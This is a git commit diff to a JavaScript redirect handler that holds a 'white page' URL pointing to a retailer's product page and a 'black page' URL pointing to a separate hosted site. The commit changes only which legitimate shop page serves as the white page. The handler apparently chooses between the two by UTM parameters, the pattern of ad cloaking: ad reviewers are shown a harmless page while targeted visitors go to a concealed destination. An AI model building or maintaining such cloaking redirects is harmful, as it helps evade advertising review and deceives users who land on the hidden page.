8a548630e4f903fcd4f8575d54b1d83eb2fed971
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-17 02:56:50 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://foneking.com.au/products/crossbody-cord?variant=50391992140095";
+    const whitePageURL = "https://www.princesspolly.com.au/products/yumiko-romper-cherry-sparkle";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
